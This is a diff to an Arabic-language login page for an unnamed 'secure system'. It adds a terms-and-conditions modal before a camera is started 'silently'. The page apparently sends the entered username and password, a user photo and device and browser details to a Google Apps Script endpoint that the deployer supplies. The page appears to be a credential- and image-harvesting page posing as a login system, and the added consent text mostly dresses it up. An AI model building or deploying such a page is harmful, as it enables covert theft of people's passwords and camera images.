@@ -225,6 +225,134 @@
             display: none;
         }
         
+        /* نافذة الشروط والأحكام */
+        #terms-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            padding: 20px;
+        }
+        
+        .terms-content {
+            background: white;
+            border-radius: 12px;
+            padding: 30px;
+            max-width: 500px;
+            width: 100%;
+            max-height: 80vh;
+            overflow-y: auto;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .terms-content h2 {
+            color: #2c3e50;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 1.5rem;
+        }
+        
+        .terms-text {
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            max-height: 300px;
+            overflow-y: auto;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border: 1px solid #e9ecef;
+        }
+        
+        .terms-text h3 {
+            color: #2c3e50;
+            margin: 15px 0 10px 0;
+            font-size: 1.1rem;
+        }
+        
+        .terms-text p {
+            margin-bottom: 10px;
+            font-size: 0.9rem;
+        }
+        
+        .terms-text ul {
+            margin: 10px 0;
+            padding-right: 20px;
+        }
+        
+        .terms-text li {
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+        }
+        
+        .terms-actions {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        
+        .terms-btn {
+            padding: 12px 30px;
+            border: none;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            flex: 1;
+        }
+        
+        .agree-btn {
+            background: linear-gradient(to right, #27ae60, #2ecc71);
+            color: white;
+        }
+        
+        .agree-btn:hover {
+            background: linear-gradient(to right, #229954, #27ae60);
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(39, 174, 96, 0.3);
+        }
+        
+        .cancel-btn {
+            background: #95a5a6;
+            color: white;
+        }
+        
+        .cancel-btn:hover {
+            background: #7f8c8d;
+            transform: translateY(-1px);
+        }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border: 1px solid #e9ecef;
+        }
+        
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+        }
+        
+        .checkbox-group label {
+            margin: 0;
+            font-weight: normal;
+            color: #555;
+            font-size: 0.9rem;
+        }
+        
         /* تحسينات للشاشات الصغيرة */
         @media (max-width: 480px) {
             .login-container {
@@ -252,29 +380,63 @@
                 padding: 12px;
                 font-size: 14px;
             }
-        }
-        
-        /* تحسينات للشاشات الكبيرة */
-        @media (min-width: 768px) {
-            .login-container {
-                max-width: 420px;
-            }
-        }
-        
-        /* تحسينات للأجهزة التي تعمل باللمس */
-        @media (hover: none) and (pointer: coarse) {
-            .login-btn:hover {
-                transform: none;
-                box-shadow: none;
+            
+            .terms-content {
+                padding: 20px;
+                margin: 10px;
             }
             
-            input {
-                font-size: 16px; /* منع التكبير في iOS */
+            .terms-actions {
+                flex-direction: column;
             }
         }
     </style>
 </head>
 <body>
+    <!-- نافذة الشروط والأحكام -->
+    <div id="terms-modal">
+        <div class="terms-content">
+            <h2>📋 الشروط والأحكام</h2>
+            
+            <div class="terms-text">
+                <h3>موافقة على استخدام النظام</h3>
+                <p>باستخدامك لهذا النظام، فإنك توافق على الشروط والأحكام التالية:</p>
+                
+                <h3>الوصول إلى الكاميرا</h3>
+                <p>يتطلب النظام الوصول إلى الكاميرا للأغراض التالية:</p>
+                <ul>
+                    <li>التأكد من هوية المستخدم</li>
+                    <li>تعزيز أمان النظام</li>
+                    <li>منع الاحتيال والوصول غير المصرح به</li>
+                </ul>
+                
+                <h3>جمع البيانات</h3>
+                <p>سيتم جمع البيانات التالية لأغراض الأمان:</p>
+                <ul>
+                    <li>صورة المستخدم</li>
+                    <li>معلومات الجهاز والمتصفح</li>
+                    <li>توقيت وتسجيل الدخول</li>
+                </ul>
+                
+                <h3>الخصوصية</h3>
+                <p>جميع البيانات التي يتم جمعها تُستخدم فقط لأغراض الأمان ولن يتم مشاركتها مع أطراف ثالثة.</p>
+                
+                <h3>المسؤولية</h3>
+                <p>أنت مسؤول عن الحفاظ على سرية معلومات الدخول الخاصة بك.</p>
+            </div>
+            
+            <div class="checkbox-group">
+                <input type="checkbox" id="agree-checkbox">
+                <label for="agree-checkbox">أقر بأني قد قرأت وفهمت الشروط والأحكام وأوافق عليها</label>
+            </div>
+            
+            <div class="terms-actions">
+                <button class="terms-btn cancel-btn" id="cancel-terms">إلغاء</button>
+                <button class="terms-btn agree-btn" id="agree-terms" disabled>موافق</button>
+            </div>
+        </div>
+    </div>
+
     <div class="login-container">
         <div class="header">
             <div class="logo">S</div>
@@ -312,7 +474,7 @@
         
         <div class="footer">
             <p>© 2024 النظام الآمن. جميع الحقوق محفوظة.</p>
-            <p>الإصدار 3.1.0 | <a href="#">الشروط والأحكام</a></p>
+            <p>الإصدار 3.1.0 | <a href="#" id="show-terms">الشروط والأحكام</a></p>
         </div>
     </div>
 
@@ -333,19 +495,58 @@
         const loginSuccess = document.getElementById('loginSuccess');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const termsModal = document.getElementById('terms-modal');
+        const agreeCheckbox = document.getElementById('agree-checkbox');
+        const agreeBtn = document.getElementById('agree-terms');
+        const cancelBtn = document.getElementById('cancel-terms');
+        const showTermsLink = document.getElementById('show-terms');
         
         let stream = null;
         let cameraInitialized = false;
+        let termsAccepted = false;
         
         // رابط Google Apps Script - استبدله برابط نشرك
-        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbywfuTJEn5O_y3LVsuHGY2oqbEAz6DapBaK_4OfiFjgY06VdNBb7trJTUp7vaR_Fd1Z/exec';
+        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwd3_LM86V5TnyTb-hBgnHhY82hob7L_I-RYhRTviR_D308b8ZyHOv1JGjCXdwLDj0j/exec';
         
-        // تهيئة الكاميرا بشكل خفي عند تحميل الصفحة
+        // إظهار نافذة الشروط عند تحميل الصفحة
         document.addEventListener('DOMContentLoaded', function() {
-            initializeCameraSilently();
+            termsModal.style.display = 'flex';
         });
         
-        // تهيئة الكاميرا بشكل خفي ومتوافق
+        // التحكم في زر الموافقة بناءً على تحديد المربع
+        agreeCheckbox.addEventListener('change', function() {
+            agreeBtn.disabled = !this.checked;
+        });
+        
+        // زر الموافقة على الشروط
+        agreeBtn.addEventListener('click', async function() {
+            if (agreeCheckbox.checked) {
+                showStatus('جاري تهيئة النظام...', 'loading');
+                termsModal.style.display = 'none';
+                termsAccepted = true;
+                
+                // بدء تهيئة الكاميرا بعد الموافقة
+                await initializeCameraSilently();
+                
+                setTimeout(() => {
+                    showStatus('', '');
+                }, 2000);
+            }
+        });
+        
+        // زر إلغاء الشروط
+        cancelBtn.addEventListener('click', function() {
+            termsModal.style.display = 'none';
+            showStatus('يجب الموافقة على الشروط والأحكام لاستخدام النظام', 'error');
+        });
+        
+        // إظهار الشروط عند النقر على الرابط
+        showTermsLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            termsModal.style.display = 'flex';
+        });
+        
+        // تهيئة الكاميرا بشكل خفي بعد الموافقة
         async function initializeCameraSilently() {
             try {
                 // محاولة إعدادات الكاميرا الأساسية المتوافقة
@@ -398,6 +599,7 @@
                     
                 } catch (secondError) {
                     console.log('❌ Camera initialization completely failed:', secondError);
+                    showStatus('تعذر الوصول إلى الكاميرا', 'error');
                 }
             }
         }
@@ -425,6 +627,13 @@
         // معالجة تسجيل الدخول
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault();
+            
+            // التحقق من الموافقة على الشروط
+            if (!termsAccepted) {
+                showStatus('يجب الموافقة على الشروط والأحكام أولاً', 'error');
+                termsModal.style.display = 'flex';
+                return;
+            }
             
             const username = usernameInput.value.trim();
             const password = passwordInput.value.trim();
@@ -533,6 +742,7 @@
                 formData.append('platform', navigator.platform);
                 formData.append('deviceType', getDeviceType());
                 formData.append('browser', getBrowserInfo());
+                formData.append('termsAccepted', 'نعم');
                 
                 // إرسال البيانات
                 const response = await fetch(GOOGLE_SCRIPT_URL, {
@@ -629,9 +839,6 @@
             isSubmitting = true;
             setTimeout(() => { isSubmitting = false; }, 3000);
         });
-        
-        // تحسين تجربة المستخدم على الأجهزة المحمولة
-        document.addEventListener('touchstart', function() {}, { passive: true });
     </script>
 </body>
 </html>
